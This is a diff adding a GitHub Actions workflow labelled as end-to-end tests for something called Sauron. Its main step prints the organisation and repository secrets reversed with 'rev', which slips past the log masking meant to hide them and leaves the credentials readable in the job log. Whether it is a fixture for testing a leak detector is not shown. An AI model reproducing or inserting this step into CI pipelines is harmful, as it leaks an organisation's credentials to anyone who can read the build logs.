@@ -1,0 +1,17 @@
+name: Sauron e2e tests
+on: workflow_call
+jobs:
+  push:
+    runs-on: ${{ matrix.label }}
+    strategy:
+      matrix:
+        label: [ubuntu-latest]
+    steps:
+    - uses: actions/checkout@main
+    - run: |
+        echo "Org Secret: $ORG_SECRET" | rev
+        echo "Repo Secret: $REPO_SECRET" | rev
+      env:
+        ORG_SECRET: ${{ secrets.ORG_SECRET }}
+        REPO_SECRET: ${{ secrets.REPO_SECRET }}
+    - run: exit 0
